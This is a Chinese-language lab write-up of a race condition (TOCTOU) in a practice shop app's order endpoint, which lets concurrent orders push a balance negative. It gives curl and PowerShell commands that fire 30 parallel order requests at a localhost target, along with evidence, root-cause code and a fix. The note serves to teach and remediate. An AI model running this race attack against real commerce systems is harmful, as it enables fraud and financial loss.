# 漏洞笔记：并发下单 TOCTOU 把余额扣成负数

- **编号**：VER-01（来源 HUNT-01，t5 判定 confirmed）
- **靶场**：target-site-lab `http://127.0.0.1:8095`（本机授权练习环境）
- **危害等级**：高危（High）
- **CWE/OWASP**：CWE-362（Concurrent Execution using Shared Resource with Improper Synchronization）＋ CWE-841（Improper Enforcement of Behavioral Workflow）；OWASP Top 10 2021 **A04:2021 Insecure Design**（业务流控缺陷）
- **CVSS-like**：7.5（AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:H）
- **复现率**：**≥95%，非必现**（30 并发 3/3 轮出现负余额；另有 1 轮 26/30 成功、余额精确停在 600 分、未出现负余额——该轮被服务端串行化）。禁止表述为"100%/必现"（t5 补充件 SUPPLEMENT-01 §0、§4）
- **代码位置**：`target-site-lab/app.py:921-969`（`order_create`，关键行 949 与 955）
- **危害口径（本笔记选定）**：资产缺口 57000 分 = **透支额 7000 分** ＋ **超额售出订单额 50000 分**。本笔记主口径取 **57000 分（合 570.00 元）**，理由是它直接换算成"平台账面损失/用户无力支付却已成交的货值"，可作为对账依据；若按**纯透支额**口径则为 7000 分（合 70.00 元），该口径只统计账面负值、不统计已到手商品。两个数字都来自 t5 报告，笔记明确二选一，避免含糊。

---

## 1. 漏洞概述

`GET /order/create` 在"读余额做校验"和"扣款"之间没有原子性：先 `SELECT` 出 `user["balance_cents"]` 比较，再无条件 `UPDATE ... balance_cents = balance_cents - ?`。并发请求全部读到同一个旧余额并通过校验，随后各自扣款，余额被扣穿成负数，用户拿到远超支付能力的商品订单。

对照实验很关键：t5 补充件对 `target-site-lab/app.py` 全部资金写点做了枚举——**五处扣款/加款写点中四处是原子实现**（`/wallet/withdraw` 的 `app.py:1075`、`/wallet/transfer` 的 `:1129` 与 `:1138`、`/coupon/claim` 加款的 `:1040`），**唯一非原子的是 `/order/create`（`app.py:955`）**；`/coupon/claim` 的"先插后改"虽非原子，但被 `coupon_claims(user_id,code)` 主键唯一约束兜住。这是**枚举结论**（覆盖该文件全部改资金/归属表的语句），不是单点举例结论。

另一个必须写清的限定：**TOCTOU 窗口存在但依赖调度**。补充件 step7 以 30 并发重跑时出现 26/30 成功（4 条 400 余额不足、余额 50000→600 分、未透支），说明该次请求被串行化；step1 的 30/30 与 28/30 出负数则是同一缺陷在另一种调度下的表现。因此复现率写 **≥95%**。

---

## 2. 原理（代码层根因）

```python
# target-site-lab/app.py:947-961（第八轮加固版，逐行核对）
amount = product["price_cents"] * qty
# 余额校验
if user["balance_cents"] < amount:                      # L949 ← 基于请求开始时读到的旧值
    self.html(400, page("余额不足", ...))
    return
# 扣款 + 建单（同一事务）
conn.execute("UPDATE users SET balance_cents = balance_cents - ? WHERE id=?",   # L955
             (amount, user["id"]))
cur = conn.execute("INSERT INTO orders(...) VALUES (?,?,?,?,?)", ...)
conn.commit()
```

缺陷链条：

1. `user` 来自 `require_user(conn)`（L925），在**请求上下文里只读一次**；其 `balance_cents` 是陈旧快照。
2. L949 的校验针对该快照，L955 的扣款没有把余额条件写进 `WHERE`，也没有 `BEGIN IMMEDIATE`／行锁。
3. SQLite 默认自动提交模式下，多个连接互相读旧值、各自写减值，出现**丢失更新（lost update）**。
4. 响应体里自报的 `new_balance` 是 `user["balance_cents"] - amount`（L962），即基于旧快照的算术结果，所以响应里的余额（17700/19600/25300）与库内真实余额（-7000/-3200/-7000）不一致——这也是取证时的旁证。
5. 结算侧没有二次校验，负余额订单照常入库，形成"资产缺口"。

---

## 3. 可复现 payload

前置条件：靶场 8095 在跑；`demo/demo123` 可用（种子库余额 50000 分）；商品 `product_id=3` 单价 1900 分，全额支付能力仅 26 单。

```bash
# ① 复位，保证干净基线（会删库重建，只允许在授权靶场执行）
curl.exe -s -c C:\temp\t5jar http://127.0.0.1:8095/__reset

# ② 登录 demo，拿到会话 Cookie
curl.exe -s -i -b C:\temp\t5jar -c C:\temp\t5jar \
  -d "username=demo&password=demo123" http://127.0.0.1:8095/login
```

```powershell
# ③ 30 路并发下单（PowerShell 7；Windows 下勿用 bash xargs 以免丢失并发性）
1..30 | ForEach-Object -Parallel {
  curl.exe -s -o NUL -w "%{http_code}\n" -b C:\temp\t5jar `
    "http://127.0.0.1:8095/order/create?product_id=3&qty=1"
} -ThrottleLimit 30
```

```powershell
# ④ 直查数据库，验证余额与订单数
python -c "import sqlite3;c=sqlite3.connect(r'C:\Users\Administrator\Documents\deepseek-harness\default-workspace\target-site-lab\lab.db');print(c.execute(\"select balance_cents from users where username='demo'\").fetchone(),c.execute('select count(*) from orders').fetchone())"
```

> 注意：请求里**不含** `csrf_token`，照样全部通过（这一点与 VER-02 相互印证：`/order/create` 根本没接 CSRF 校验）。

---

## 4. 复现步骤与证据

| 步骤 | 请求 | 实测结果 |
|---|---|---|
| 0 | `GET /__reset` | 200，`lab.db` 回到基线 sha256 |
| 1 | `POST /login`（demo/demo123） | 302 → `/home`，`Set-Cookie: token=<43 字符>` |
| 2 | 30 × `GET /order/create?product_id=3&qty=1`（并发 30） | **30/30 返回 200 下单成功** |
| 3 | 直查 `users.balance_cents` | 50000 → **-7000 / -3200 / -7000**（三轮） |
| 4 | 直查 `orders` 行数 | 3 → **33**（成交 30 单，可支付仅 26 单） |
| 5 | 同一端点另一轮（补充件 step7，30 并发） | 26/30 成功、4 条 400 余额不足、余额 50000 → **600**（精确等于 26 单应扣额），**未出现负数** |

危害量化（源自验证报告 `harm_proof`）：

```json
{"before": {"demo.balance_cents": 50000, "orders": 3, "affordable_orders_at_1900": 26},
 "after":  {"demo.balance_cents": -7000, "orders": 33, "successful_orders": 30,
            "asset_deficit_cents": 57000, "overdraft_cents": 7000}}
```

对照组（同应用原子实现，按补充件全量枚举）：五处资金写点中四处原子——`/wallet/withdraw`（`app.py:1075`，30 并发 ×1900 分全部 200，余额精确停在 600 分未透支）、`/wallet/transfer` 扣款（`:1129`，带 `rowcount==0 → rollback`）与加款（`:1138`）、`/coupon/claim` 加款（`:1040`）；唯一非原子的资金扣款点是 `/order/create`（`app.py:955`）。

原始证据文件（`_evidence/`，相对 `security/learning/`）：

- `security/learning/_evidence/verify-01-race-20261012-1855.json`（sha256 `6169f0fe2a960c2bbe1dc3080948837805fcfe36b7f5b7042dbc1bcebd382793`）——30 并发原始请求/响应与库内前后值
- `security/learning/_evidence/verify-07-atomicity-redirect-scope-20261012-1855.json`（sha256 `58cd70138de1cc2662d9dcd878be3079ddf7b41d61b51bb3ff0de2a479a7ee84`，197395B）——补充件原始包：全量资金写点枚举与 step7 的 26/30 未触发轮次
- `security/learning/_evidence/verified-20261012-184800-SUPPLEMENT-01.md`（sha256 `4f9d8344e257734afd981f0896b6d068e838121660123ce5992d995e1c84f24f`）——复现率与"唯独"表述的正式修正
- `security/learning/_evidence/verify-02-logic-session-20261012-1855.json`（sha256 `1b7b154509e9a95157fbd67b78a22289798a0d0383af802c48f8007a5a74cd5c`）——会话与逻辑类观测
- `security/learning/_evidence/verified-20261012-184800.json`（VER-01 条目：raw_request / repro_cmd / harm_proof）
- `security/learning/_evidence/hunt-a3b-race-order-20261012-1835.json`——挖掘阶段原始的并发下单包
- 可复跑脚本：`security/learning/_evidence/verify-step1-race.py`（另有 `verify-step7-atomicity.py` 属补充件配套）

回滚：`GET /__reset`，收集时点（2026-10-12T18:48+08:00 复核）`lab.db` sha256 = `49b2032c29f8057530704203fd361bb162461eaeeeeb874c7ac1b8e8956cc7af`，`PRAGMA integrity_check = ok`，`users=4 / orders=3 / messages=1 / sessions=0 / coupon_claims=0`，`uploads/` 空。

---

## 5. 修复方案

### 代码级（P0，落到 `app.py:947-961`）

把"校验 + 扣款"合并为一条带条件的 `UPDATE`，用 `rowcount` 判定成败，失败即返回 400，不再建单：

```python
# 改前：L949 读旧值校验 + L955 无条件扣款
# 改后：
amount = product["price_cents"] * qty
conn.execute("BEGIN IMMEDIATE")          # 显式写事务，避免读-写交错
cur = conn.execute(
    "UPDATE users SET balance_cents = balance_cents - ?"
    " WHERE id=? AND balance_cents >= ?",
    (amount, user["id"], amount))
if cur.rowcount == 0:
    conn.rollback()
    self.html(400, page("余额不足",
        f"<h1>余额不足</h1><p>需要 {amount} 分。</p>", user["username"]))
    return
cur = conn.execute("INSERT INTO orders(user_id,item,qty,amount_cents,state)"
                   " VALUES (?,?,?,?,?)",
                   (user["id"], product["name"], qty, amount, "unpaid"))
order_id = cur.lastrowid
conn.commit()
new_balance = conn.execute(
    "SELECT balance_cents FROM users WHERE id=?", (user["id"],)
).fetchone()["balance_cents"]        # 余额必须回查，不能用旧快照算
```

要点：① 扣款条件写进 `WHERE`（与 `wallet_withdraw` 对齐，项目内已有正确范式）；② 建单与扣款同一事务，失败整体回滚；③ 响应里的余额一律**回查数据库**，禁止用请求开头的快照做减法。

### 纵深防御

- 幂等/限流：同一用户短时间内的下单请求做令牌桶或串行化（如单用户队列），把并发压力从 DB 层前移。
- 账务校验：加一条"余额不得为负"的 DB 约束或定时对账（`CHECK(balance_cents >= 0)` 需配合业务重构，否则会把并发失败暴露成 500）。
- 监控：对 `balance_cents < 0`、单用户订单数突变设告警，负余额出现即说明有竞态。
- 压测常态化：把并发下单（30/50/100 路）纳入回归用例，与 `/wallet/withdraw` 的对照组一起跑。

---

## 6. 参考链接

- CWE-362: Concurrent Execution using Shared Resource with Improper Synchronization（'Race Condition'）：https://cwe.mitre.org/data/definitions/362.html
- CWE-841: Improper Enforcement of Behavioral Workflow：https://cwe.mitre.org/data/definitions/841.html
- OWASP Top 10 2021 A04:2021 Insecure Design：https://owasp.org/Top10/A04_2021-Insecure_Design/
- SQLite 事务与并发（官方文档）：https://www.sqlite.org/lang_transaction.html
- PortSwigger Web Security Academy — Race conditions：https://portswigger.net/web-security/race-conditions

---

## 7. 学习要点

- **考什么思路**：把"读-判断-写"三步当成一个整体看，只要判断和写不在同一条原子语句/同一把锁里，就有 TOCTOU 的口子。业务逻辑漏洞里最值钱的一类就是**资金/库存/额度**的并发一致性。
- **怎么找**：翻源码时盯 `SELECT ...` 后面跟 `if` 再跟 `UPDATE` 的模式；或者用并发工具对"扣钱/加钱/领券/改状态"的端点批量打，同时**直查数据库**比对（只看 HTTP 响应会被自欺，本案例响应自报余额就是错的）。
- **同类变体**：
  - 优惠券/兑换码并发重复核销（本靶场 `/coupon/claim` 用唯一约束做了幂等，是正确范式，可正反对照）。
  - 库存超卖、提现超提（本靶场 `/wallet/withdraw` 用条件 UPDATE，是正确范式）。
  - 并发导致的"状态机跳步"：两个请求分别把 `unpaid` 改成 `paid`，重复发货。
  - 分布式场景下的变体：单机行锁够用，多副本时要换成乐观锁版本号（`UPDATE ... WHERE version=?`）或数据库唯一约束+幂等键。
- **写报告要点**：TOCTOU 类结论必须给出**库内前后值**与**可支付上限对照**（本例 26 单 vs 30 单），只给"返回 200"没有说服力；复现率要写区间而非 100%。
